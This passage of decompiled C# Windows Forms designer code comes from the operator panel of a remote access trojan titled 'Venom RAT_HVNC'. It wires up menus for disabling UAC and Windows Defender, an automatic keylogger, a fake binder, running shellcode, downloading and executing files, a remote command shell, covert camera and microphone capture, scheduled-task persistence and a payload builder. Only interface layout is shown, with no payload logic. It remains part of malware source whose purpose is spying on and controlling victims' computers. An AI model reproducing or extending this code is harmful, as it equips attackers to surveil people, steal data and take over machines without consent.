        (ToolStripItem) this.sendFileFromUrlToolStripMenuItem,
        (ToolStripItem) this.downloadAndExecuteToolStripMenuItem,
        (ToolStripItem) this.sENDFILETOMEMORYToolStripMenuItem1,
        (ToolStripItem) this.disableUACToolStripMenuItem1,
        (ToolStripItem) this.disableWDToolStripMenuItem1,
        (ToolStripItem) this.installSchtaskToolStripMenuItem,
        (ToolStripItem) this.uPDATEToolStripMenuItem1,
        (ToolStripItem) this.autoKeyloggerToolStripMenuItem,
        (ToolStripItem) this.fakeBinderToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator4,
        (ToolStripItem) this.dELETETASKToolStripMenuItem
      });
      this.contextMenuTasks.Name = "contextMenuStrip4";
      this.contextMenuTasks.ShowImageMargin = false;
      this.contextMenuTasks.Size = new Size(157, 230);
      this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
      this.sendFileFromUrlToolStripMenuItem.Size = new Size(156, 22);
      this.sendFileFromUrlToolStripMenuItem.Text = "Send file from url";
      this.sendFileFromUrlToolStripMenuItem.Click += new EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
      this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
      this.downloadAndExecuteToolStripMenuItem.Size = new Size(156, 22);
      this.downloadAndExecuteToolStripMenuItem.Text = "Send file to disk";
      this.downloadAndExecuteToolStripMenuItem.Click += new EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
      this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
      this.sENDFILETOMEMORYToolStripMenuItem1.Size = new Size(156, 22);
      this.sENDFILETOMEMORYToolStripMenuItem1.Text = "Send file to memory";
      this.sENDFILETOMEMORYToolStripMenuItem1.Click += new EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
      this.disableUACToolStripMenuItem1.Name = "disableUACToolStripMenuItem1";
      this.disableUACToolStripMenuItem1.Size = new Size(156, 22);
      this.disableUACToolStripMenuItem1.Text = "Disable UAC";
      this.disableUACToolStripMenuItem1.Click += new EventHandler(this.disableUACToolStripMenuItem1_Click);
      this.disableWDToolStripMenuItem1.Name = "disableWDToolStripMenuItem1";
      this.disableWDToolStripMenuItem1.Size = new Size(156, 22);
      this.disableWDToolStripMenuItem1.Text = "Disable WD";
      this.disableWDToolStripMenuItem1.Click += new EventHandler(this.disableWDToolStripMenuItem1_Click);
      this.installSchtaskToolStripMenuItem.Name = "installSchtaskToolStripMenuItem";
      this.installSchtaskToolStripMenuItem.Size = new Size(156, 22);
      this.installSchtaskToolStripMenuItem.Text = "Install Schtask";
      this.installSchtaskToolStripMenuItem.Click += new EventHandler(this.installSchtaskToolStripMenuItem_Click);
      this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
      this.uPDATEToolStripMenuItem1.Size = new Size(156, 22);
      this.uPDATEToolStripMenuItem1.Text = "Update all clients";
      this.uPDATEToolStripMenuItem1.Click += new EventHandler(this.UPDATEToolStripMenuItem1_Click);
      this.autoKeyloggerToolStripMenuItem.Name = "autoKeyloggerToolStripMenuItem";
      this.autoKeyloggerToolStripMenuItem.Size = new Size(156, 22);
      this.autoKeyloggerToolStripMenuItem.Text = "Auto Keylogger";
      this.autoKeyloggerToolStripMenuItem.Click += new EventHandler(this.autoKeyloggerToolStripMenuItem_Click);
      this.fakeBinderToolStripMenuItem.Name = "fakeBinderToolStripMenuItem";
      this.fakeBinderToolStripMenuItem.Size = new Size(156, 22);
      this.fakeBinderToolStripMenuItem.Text = "Fake Binder";
      this.fakeBinderToolStripMenuItem.Click += new EventHandler(this.fakeBinderToolStripMenuItem_Click);
      this.toolStripSeparator4.Name = "toolStripSeparator4";
      this.toolStripSeparator4.Size = new Size(153, 6);
      this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
      this.dELETETASKToolStripMenuItem.Size = new Size(156, 22);
      this.dELETETASKToolStripMenuItem.Text = "Delete";
      this.dELETETASKToolStripMenuItem.Click += new EventHandler(this.DELETETASKToolStripMenuItem_Click);
      this.tabPage11.BackColor = Color.FromArgb(37, 37, 37);
      this.tabPage11.Location = new Point(4, 22);
      this.tabPage11.Margin = new Padding(2);
      this.tabPage11.Name = "tabPage11";
      this.tabPage11.Padding = new Padding(2);
      this.tabPage11.Size = new Size(502, 109);
      this.tabPage11.TabIndex = 0;
      this.tabPage11.Text = "Clients1";
      this.guna2DragControl1.TargetControl = (Control) this.guna2Panel1;
      ((Control) this.guna2Panel1).BackColor = Color.FromArgb(30, 30, 30);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.guna2Separator1);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.guna2Separator4);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.guna2Separator2);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.guna2ControlBox2);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.guna2ControlBox1);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.label3);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.label2);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.label1);
      ((Control) this.guna2Panel1).Controls.Add((Control) this.pictureBox1);
      ((Control) this.guna2Panel1).Dock = DockStyle.Top;
      ((Control) this.guna2Panel1).Location = new Point(0, 0);
      ((Control) this.guna2Panel1).Name = "guna2Panel1";
      this.guna2Panel1.ShadowDecoration.Parent = (Control) this.guna2Panel1;
      ((Control) this.guna2Panel1).Size = new Size(1560, 60);
      ((Control) this.guna2Panel1).TabIndex = 131;
      ((Control) this.guna2Separator1).Anchor = AnchorStyles.Right;
      this.guna2Separator1.FillColor = Color.FromArgb(8, 104, 81);
      this.guna2Separator1.FillStyle = DashStyle.Custom;
      this.guna2Separator1.FillThickness = 2;
      ((Control) this.guna2Separator1).Location = new Point(1359, 45);
      ((Control) this.guna2Separator1).Name = "guna2Separator1";
      ((Control) this.guna2Separator1).Size = new Size(201, 10);
      ((Control) this.guna2Separator1).TabIndex = 148;
      ((Control) this.guna2Separator4).Anchor = AnchorStyles.Left;
      this.guna2Separator4.FillColor = Color.FromArgb(8, 104, 81);
      this.guna2Separator4.FillStyle = DashStyle.Custom;
      this.guna2Separator4.FillThickness = 2;
      ((Control) this.guna2Separator4).Location = new Point(68, 45);
      ((Control) this.guna2Separator4).Name = "guna2Separator4";
      ((Control) this.guna2Separator4).Size = new Size(175, 10);
      ((Control) this.guna2Separator4).TabIndex = 147;
      ((Control) this.guna2Separator2).Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
      this.guna2Separator2.FillColor = Color.FromArgb(8, 104, 81);
      this.guna2Separator2.FillStyle = DashStyle.Custom;
      this.guna2Separator2.FillThickness = 4;
      ((Control) this.guna2Separator2).Location = new Point(0, -3);
      ((Control) this.guna2Separator2).Name = "guna2Separator2";
      ((Control) this.guna2Separator2).Size = new Size(1560, 10);
      ((Control) this.guna2Separator2).TabIndex = 129;
      ((Control) this.guna2ControlBox2).Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.guna2ControlBox2.ControlBoxType = (ControlBoxType) 0;
      this.guna2ControlBox2.FillColor = Color.Transparent;
      this.guna2ControlBox2.HoverState.Parent = this.guna2ControlBox2;
      this.guna2ControlBox2.IconColor = Color.White;
      ((Control) this.guna2ControlBox2).Location = new Point(1472, 11);
      ((Control) this.guna2ControlBox2).Name = "guna2ControlBox2";
      this.guna2ControlBox2.ShadowDecoration.Parent = (Control) this.guna2ControlBox2;
      ((Control) this.guna2ControlBox2).Size = new Size(35, 33);
      ((Control) this.guna2ControlBox2).TabIndex = 11;
      ((Control) this.guna2ControlBox1).Anchor = AnchorStyles.Top | AnchorStyles.Right;
      ((Control) this.guna2ControlBox1).BackColor = Color.Transparent;
      this.guna2ControlBox1.FillColor = Color.Transparent;
      this.guna2ControlBox1.HoverState.Parent = this.guna2ControlBox1;
      this.guna2ControlBox1.IconColor = Color.White;
      ((Control) this.guna2ControlBox1).Location = new Point(1519, 10);
      ((Control) this.guna2ControlBox1).Name = "guna2ControlBox1";
      this.guna2ControlBox1.ShadowDecoration.Parent = (Control) this.guna2ControlBox1;
      ((Control) this.guna2ControlBox1).Size = new Size(35, 33);
      ((Control) this.guna2ControlBox1).TabIndex = 10;
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.ForeColor = Color.FromArgb(8, 104, 81);
      this.label3.Location = new Point(1409, 26);
      this.label3.Name = "label3";
      this.label3.Size = new Size(35, 16);
      this.label3.TabIndex = 130;
      this.label3.Text = "5.0.4";
      this.label3.TextAlign = ContentAlignment.BottomCenter;
      this.label2.AutoSize = true;
      this.label2.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label2.ForeColor = Color.Gainsboro;
      this.label2.Location = new Point(1356, 26);
      this.label2.Name = "label2";
      this.label2.Size = new Size(57, 16);
      this.label2.TabIndex = 130;
      this.label2.Text = "Version:";
      this.label2.TextAlign = ContentAlignment.BottomCenter;
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Microsoft Sans Serif", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = Color.Gainsboro;
      this.label1.Location = new Point(64, 20);
      this.label1.Name = "label1";
      this.label1.Size = new Size(179, 24);
      this.label1.TabIndex = 130;
      this.label1.Text = "Venom RAT_HVNC";
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(3, 0);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(55, 58);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 15;
      this.pictureBox1.TabStop = false;
      this.FileToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[4]
      {
        (ToolStripItem) this.BuilderToolStripMenuItem,
        (ToolStripItem) this.BlockToolStripMenuItem,
        (ToolStripItem) this.SettingToolStripMenuItem,
        (ToolStripItem) this.ExitToolStripMenuItem
      });
      this.FileToolStripMenuItem.Name = "FileToolStripMenuItem";
      this.FileToolStripMenuItem.Size = new Size(37, 20);
      this.FileToolStripMenuItem.Text = "File";
      this.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem";
      this.BuilderToolStripMenuItem.Size = new Size(111, 22);
      this.BuilderToolStripMenuItem.Text = "Builder";
      this.BuilderToolStripMenuItem.Click += new EventHandler(this.builderToolStripMenuItem1_Click);
      this.BlockToolStripMenuItem.Name = "BlockToolStripMenuItem";
      this.BlockToolStripMenuItem.Size = new Size(111, 22);
      this.BlockToolStripMenuItem.Text = "Block";
      this.SettingToolStripMenuItem.Name = "SettingToolStripMenuItem";
      this.SettingToolStripMenuItem.Size = new Size(111, 22);
      this.SettingToolStripMenuItem.Text = "Setting";
      this.SettingToolStripMenuItem.Click += new EventHandler(this.SettingToolStripMenuItem_Click);
      this.ExitToolStripMenuItem.Name = "ExitToolStripMenuItem";
      this.ExitToolStripMenuItem.Size = new Size(111, 22);
      this.ExitToolStripMenuItem.Text = "Exit";
      this.ExitToolStripMenuItem.Click += new EventHandler(this.ExitToolStripMenuItem_Click);
      this.HelpToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.DocumentToolStripMenuItem,
        (ToolStripItem) this.AboutToolStripMenuItem
      });
      this.HelpToolStripMenuItem.Name = "HelpToolStripMenuItem";
      this.HelpToolStripMenuItem.Size = new Size(44, 20);
      this.HelpToolStripMenuItem.Text = "Help";
      this.DocumentToolStripMenuItem.Name = "DocumentToolStripMenuItem";
      this.DocumentToolStripMenuItem.Size = new Size(130, 22);
      this.DocumentToolStripMenuItem.Text = "Document";
      this.DocumentToolStripMenuItem.Click += new EventHandler(this.DocumentToolStripMenuItem_Click);
      this.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem";
      this.AboutToolStripMenuItem.Size = new Size(130, 22);
      this.AboutToolStripMenuItem.Text = "About";
      this.AboutToolStripMenuItem.Click += new EventHandler(this.aboutToolStripMenuItem1_Click);
      this.menuStrip1.Dock = DockStyle.None;
      this.menuStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.FileToolStripMenuItem,
        (ToolStripItem) this.HelpToolStripMenuItem
      });
      this.menuStrip1.Location = new Point(533, 301);
      this.menuStrip1.Name = "menuStrip1";
      this.menuStrip1.Size = new Size(89, 24);
      this.menuStrip1.TabIndex = 4;
      this.menuStrip1.Text = "menuStrip1";
      this.menuStrip1.ItemClicked += new ToolStripItemClickedEventHandler(this.menuStrip1_ItemClicked);
      this.ConnectTimeout.Enabled = true;
      this.ConnectTimeout.Interval = 5000;
      this.ConnectTimeout.Tick += new EventHandler(this.ConnectTimeout_Tick);
      this.TimerTask.Enabled = true;
      this.TimerTask.Interval = 5000;
      this.TimerTask.Tick += new EventHandler(this.TimerTask_Tick);
      this.notifyIcon1.Icon = (Icon) componentResourceManager.GetObject("notifyIcon1.Icon");
      this.notifyIcon1.Text = "VenomRAT_HVNC";
      this.notifyIcon1.Visible = true;
      this.performanceCounter2.CategoryName = "Memory";
      this.performanceCounter2.CounterName = "% Committed Bytes In Use";
      this.performanceCounter1.CategoryName = "Processor";
      this.performanceCounter1.CounterName = "% Processor Time";
      this.performanceCounter1.InstanceName = "_Total";
      this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
      this.cLEARToolStripMenuItem.Size = new Size(76, 22);
      this.cLEARToolStripMenuItem.Text = "Clear";
      this.cLEARToolStripMenuItem.Click += new EventHandler(this.CLEARToolStripMenuItem_Click);
      this.contextMenuLogs.ImageScalingSize = new Size(24, 24);
      this.contextMenuLogs.Items.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.cLEARToolStripMenuItem
      });
      this.contextMenuLogs.Name = "contextMenuLogs";
      this.contextMenuLogs.ShowImageMargin = false;
      this.contextMenuLogs.Size = new Size(77, 26);
      this.UpdateUI.Enabled = true;
      this.UpdateUI.Interval = 500;
      this.UpdateUI.Tick += new EventHandler(this.UpdateUI_Tick);
      this.ping.Enabled = true;
      this.ping.Interval = 30000;
      this.ping.Tick += new EventHandler(this.ping_Tick);
      this.SystemControlToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.ClientControlToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator13,
        (ToolStripItem) this.SystemToolStripMenuItem
      });
      this.SystemControlToolStripMenuItem.ForeColor = Color.Black;
      this.SystemControlToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SystemControlToolStripMenuItem.Image");
      this.SystemControlToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.SystemControlToolStripMenuItem.Name = "SystemControlToolStripMenuItem";
      this.SystemControlToolStripMenuItem.Size = new Size(230, 34);
      this.SystemControlToolStripMenuItem.Text = "Client Control";
      this.ClientControlToolStripMenuItem.BackColor = Color.Black;
      this.ClientControlToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[7]
      {
        (ToolStripItem) this.UninstallToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator23,
        (ToolStripItem) this.StopToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator24,
        (ToolStripItem) this.RestartToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator25,
        (ToolStripItem) this.UpdateToolStripMenuItem
      });
      this.ClientControlToolStripMenuItem.ForeColor = Color.Black;
      this.ClientControlToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ClientControlToolStripMenuItem.Image");
      this.ClientControlToolStripMenuItem.Name = "ClientControlToolStripMenuItem";
      this.ClientControlToolStripMenuItem.Size = new Size(217, 34);
      this.ClientControlToolStripMenuItem.Text = "Connection Control";
      this.UninstallToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.UninstallToolStripMenuItem.ForeColor = Color.Black;
      this.UninstallToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("UninstallToolStripMenuItem.Image");
      this.UninstallToolStripMenuItem.Name = "UninstallToolStripMenuItem";
      this.UninstallToolStripMenuItem.Size = new Size(180, 34);
      this.UninstallToolStripMenuItem.Text = "Uninstall";
      this.UninstallToolStripMenuItem.Click += new EventHandler(this.UninstallToolStripMenuItem_Click);
      this.toolStripSeparator23.Name = "toolStripSeparator23";
      this.toolStripSeparator23.Size = new Size(177, 6);
      this.StopToolStripMenuItem1.BackColor = Color.FromArgb(12, 89, 71);
      this.StopToolStripMenuItem1.ForeColor = Color.Black;
      this.StopToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("StopToolStripMenuItem1.Image");
      this.StopToolStripMenuItem1.Name = "StopToolStripMenuItem1";
      this.StopToolStripMenuItem1.Size = new Size(180, 34);
      this.StopToolStripMenuItem1.Text = "Disconnecd";
      this.StopToolStripMenuItem1.Click += new EventHandler(this.StopToolStripMenuItem1_Click);
      this.toolStripSeparator24.Name = "toolStripSeparator24";
      this.toolStripSeparator24.Size = new Size(177, 6);
      this.RestartToolStripMenuItem1.BackColor = Color.FromArgb(12, 89, 71);
      this.RestartToolStripMenuItem1.ForeColor = Color.Black;
      this.RestartToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("RestartToolStripMenuItem1.Image");
      this.RestartToolStripMenuItem1.Name = "RestartToolStripMenuItem1";
      this.RestartToolStripMenuItem1.Size = new Size(180, 34);
      this.RestartToolStripMenuItem1.Text = "Reconnect";
      this.RestartToolStripMenuItem1.Click += new EventHandler(this.RestartToolStripMenuItem1_Click);
      this.toolStripSeparator25.Name = "toolStripSeparator25";
      this.toolStripSeparator25.Size = new Size(177, 6);
      this.UpdateToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.UpdateToolStripMenuItem.ForeColor = Color.Black;
      this.UpdateToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("UpdateToolStripMenuItem.Image");
      this.UpdateToolStripMenuItem.Name = "UpdateToolStripMenuItem";
      this.UpdateToolStripMenuItem.Size = new Size(180, 34);
      this.UpdateToolStripMenuItem.Text = "Client Update";
      this.UpdateToolStripMenuItem.Click += new EventHandler(this.UpdateToolStripMenuItem_Click);
      this.toolStripSeparator13.Name = "toolStripSeparator13";
      this.toolStripSeparator13.Size = new Size(214, 6);
      this.SystemToolStripMenuItem.BackColor = Color.FromArgb(128, 64, 0);
      this.SystemToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[5]
      {
        (ToolStripItem) this.LogoutToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator14,
        (ToolStripItem) this.RebootToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator15,
        (ToolStripItem) this.ShutDownToolStripMenuItem
      });
      this.SystemToolStripMenuItem.ForeColor = Color.Black;
      this.SystemToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SystemToolStripMenuItem.Image");
      this.SystemToolStripMenuItem.Name = "SystemToolStripMenuItem";
      this.SystemToolStripMenuItem.Size = new Size(217, 34);
      this.SystemToolStripMenuItem.Text = "Client Restart";
      this.LogoutToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.LogoutToolStripMenuItem.ForeColor = Color.Black;
      this.LogoutToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("LogoutToolStripMenuItem.Image");
      this.LogoutToolStripMenuItem.Name = "LogoutToolStripMenuItem";
      this.LogoutToolStripMenuItem.Size = new Size(161, 34);
      this.LogoutToolStripMenuItem.Text = "Logout";
      this.LogoutToolStripMenuItem.Click += new EventHandler(this.LogoutToolStripMenuItem_Click);
      this.toolStripSeparator14.Name = "toolStripSeparator14";
      this.toolStripSeparator14.Size = new Size(158, 6);
      this.RebootToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.RebootToolStripMenuItem.ForeColor = Color.Black;
      this.RebootToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RebootToolStripMenuItem.Image");
      this.RebootToolStripMenuItem.Name = "RebootToolStripMenuItem";
      this.RebootToolStripMenuItem.Size = new Size(161, 34);
      this.RebootToolStripMenuItem.Text = "Reboot";
      this.RebootToolStripMenuItem.Click += new EventHandler(this.RebootToolStripMenuItem_Click);
      this.toolStripSeparator15.Name = "toolStripSeparator15";
      this.toolStripSeparator15.Size = new Size(158, 6);
      this.ShutDownToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.ShutDownToolStripMenuItem.ForeColor = Color.Black;
      this.ShutDownToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ShutDownToolStripMenuItem.Image");
      this.ShutDownToolStripMenuItem.Name = "ShutDownToolStripMenuItem";
      this.ShutDownToolStripMenuItem.Size = new Size(161, 34);
      this.ShutDownToolStripMenuItem.Text = "Shut Down";
      this.ShutDownToolStripMenuItem.Click += new EventHandler(this.ShutDownToolStripMenuItem_Click);
      this.RemoteManagerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[15]
      {
        (ToolStripItem) this.RemoteShellToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator16,
        (ToolStripItem) this.RemoteScreenToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator17,
        (ToolStripItem) this.RemoteCameraToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator18,
        (ToolStripItem) this.FileManagerToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator19,
        (ToolStripItem) this.remoteRegeditToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator20,
        (ToolStripItem) this.ProcessManagerToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator21,
        (ToolStripItem) this.netstatToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator22,
        (ToolStripItem) this.RecordToolStripMenuItem
      });
      this.RemoteManagerToolStripMenuItem.Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.RemoteManagerToolStripMenuItem.ForeColor = Color.Black;
      this.RemoteManagerToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RemoteManagerToolStripMenuItem.Image");
      this.RemoteManagerToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.RemoteManagerToolStripMenuItem.Name = "RemoteManagerToolStripMenuItem";
      this.RemoteManagerToolStripMenuItem.Size = new Size(230, 34);
      this.RemoteManagerToolStripMenuItem.Text = "Control Management";
      this.RemoteManagerToolStripMenuItem.TextImageRelation = TextImageRelation.TextAboveImage;
      this.RemoteShellToolStripMenuItem.ForeColor = Color.Black;
      this.RemoteShellToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RemoteShellToolStripMenuItem.Image");
      this.RemoteShellToolStripMenuItem.Name = "RemoteShellToolStripMenuItem";
      this.RemoteShellToolStripMenuItem.Size = new Size(202, 24);
      this.RemoteShellToolStripMenuItem.Text = "Open CMD";
      this.RemoteShellToolStripMenuItem.Click += new EventHandler(this.RemoteShellToolStripMenuItem_Click);
      this.toolStripSeparator16.Name = "toolStripSeparator16";
      this.toolStripSeparator16.Size = new Size(199, 6);
      this.RemoteScreenToolStripMenuItem.BackColor = Color.Black;
      this.RemoteScreenToolStripMenuItem.ForeColor = Color.Black;
      this.RemoteScreenToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RemoteScreenToolStripMenuItem.Image");
      this.RemoteScreenToolStripMenuItem.Name = "RemoteScreenToolStripMenuItem";
      this.RemoteScreenToolStripMenuItem.Size = new Size(202, 24);
      this.RemoteScreenToolStripMenuItem.Text = "Remote Desktop";
      this.RemoteScreenToolStripMenuItem.Click += new EventHandler(this.RemoteScreenToolStripMenuItem_Click);
      this.toolStripSeparator17.Name = "toolStripSeparator17";
      this.toolStripSeparator17.Size = new Size(199, 6);
      this.RemoteCameraToolStripMenuItem.BackColor = Color.Black;
      this.RemoteCameraToolStripMenuItem.ForeColor = Color.Black;
      this.RemoteCameraToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RemoteCameraToolStripMenuItem.Image");
      this.RemoteCameraToolStripMenuItem.Name = "RemoteCameraToolStripMenuItem";
      this.RemoteCameraToolStripMenuItem.Size = new Size(202, 24);
      this.RemoteCameraToolStripMenuItem.Text = "Open Camera";
      this.RemoteCameraToolStripMenuItem.Click += new EventHandler(this.RemoteCameraToolStripMenuItem_Click);
      this.toolStripSeparator18.Name = "toolStripSeparator18";
      this.toolStripSeparator18.Size = new Size(199, 6);
      this.FileManagerToolStripMenuItem1.BackColor = Color.Black;
      this.FileManagerToolStripMenuItem1.ForeColor = Color.Black;
      this.FileManagerToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("FileManagerToolStripMenuItem1.Image");
      this.FileManagerToolStripMenuItem1.Name = "FileManagerToolStripMenuItem1";
      this.FileManagerToolStripMenuItem1.Size = new Size(202, 24);
      this.FileManagerToolStripMenuItem1.Text = "File Manager";
      this.FileManagerToolStripMenuItem1.Click += new EventHandler(this.FileManagerToolStripMenuItem1_Click);
      this.toolStripSeparator19.Name = "toolStripSeparator19";
      this.toolStripSeparator19.Size = new Size(199, 6);
      this.remoteRegeditToolStripMenuItem.BackColor = Color.Black;
      this.remoteRegeditToolStripMenuItem.ForeColor = Color.Black;
      this.remoteRegeditToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("remoteRegeditToolStripMenuItem.Image");
      this.remoteRegeditToolStripMenuItem.Name = "remoteRegeditToolStripMenuItem";
      this.remoteRegeditToolStripMenuItem.Size = new Size(202, 24);
      this.remoteRegeditToolStripMenuItem.Text = "Regedit";
      this.remoteRegeditToolStripMenuItem.Click += new EventHandler(this.remoteRegeditToolStripMenuItem_Click);
      this.toolStripSeparator20.Name = "toolStripSeparator20";
      this.toolStripSeparator20.Size = new Size(199, 6);
      this.ProcessManagerToolStripMenuItem.BackColor = Color.Black;
      this.ProcessManagerToolStripMenuItem.ForeColor = Color.Black;
      this.ProcessManagerToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("ProcessManagerToolStripMenuItem.Image");
      this.ProcessManagerToolStripMenuItem.Name = "ProcessManagerToolStripMenuItem";
      this.ProcessManagerToolStripMenuItem.Size = new Size(202, 24);
      this.ProcessManagerToolStripMenuItem.Text = "Process Manager";
      this.ProcessManagerToolStripMenuItem.Click += new EventHandler(this.ProcessManagerToolStripMenuItem_Click);
      this.toolStripSeparator21.Name = "toolStripSeparator21";
      this.toolStripSeparator21.Size = new Size(199, 6);
      this.netstatToolStripMenuItem.BackColor = Color.Black;
      this.netstatToolStripMenuItem.ForeColor = Color.Black;
      this.netstatToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("netstatToolStripMenuItem.Image");
      this.netstatToolStripMenuItem.Name = "netstatToolStripMenuItem";
      this.netstatToolStripMenuItem.Size = new Size(202, 24);
      this.netstatToolStripMenuItem.Text = "Networks Statistics";
      this.netstatToolStripMenuItem.Click += new EventHandler(this.netstatToolStripMenuItem_Click);
      this.toolStripSeparator22.Name = "toolStripSeparator22";
      this.toolStripSeparator22.Size = new Size(199, 6);
      this.RecordToolStripMenuItem.BackColor = Color.Black;
      this.RecordToolStripMenuItem.ForeColor = Color.Black;
      this.RecordToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RecordToolStripMenuItem.Image");
      this.RecordToolStripMenuItem.Name = "RecordToolStripMenuItem";
      this.RecordToolStripMenuItem.Size = new Size(202, 24);
      this.RecordToolStripMenuItem.Text = "Mic Record";
      this.RecordToolStripMenuItem.Click += new EventHandler(this.RecordToolStripMenuItem_Click);
      this.RemoteControlToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[9]
      {
        (ToolStripItem) this.SendFileToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator28,
        (ToolStripItem) this.VisteWebsiteToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator29,
        (ToolStripItem) this.runShellcodeToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator30,
        (ToolStripItem) this.ChangeWallpaperToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator31,
        (ToolStripItem) this.FileSearchToolStripMenuItem
      });
      this.RemoteControlToolStripMenuItem.Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.RemoteControlToolStripMenuItem.ForeColor = Color.Black;
      this.RemoteControlToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RemoteControlToolStripMenuItem.Image");
      this.RemoteControlToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.RemoteControlToolStripMenuItem.Name = "RemoteControlToolStripMenuItem";
      this.RemoteControlToolStripMenuItem.Size = new Size(230, 34);
      this.RemoteControlToolStripMenuItem.Text = "Control";
      this.SendFileToolStripMenuItem1.BackColor = Color.FromArgb(12, 89, 71);
      this.SendFileToolStripMenuItem1.DropDownItems.AddRange(new ToolStripItem[5]
      {
        (ToolStripItem) this.SendFileToMemoryToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator26,
        (ToolStripItem) this.SendFileToDiskToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator27,
        (ToolStripItem) this.fromUrlToolStripMenuItem
      });
      this.SendFileToolStripMenuItem1.ForeColor = Color.Black;
      this.SendFileToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("SendFileToolStripMenuItem1.Image");
      this.SendFileToolStripMenuItem1.Name = "SendFileToolStripMenuItem1";
      this.SendFileToolStripMenuItem1.Size = new Size(200, 24);
      this.SendFileToolStripMenuItem1.Text = "Transfer File";
      this.SendFileToMemoryToolStripMenuItem.BackColor = Color.Transparent;
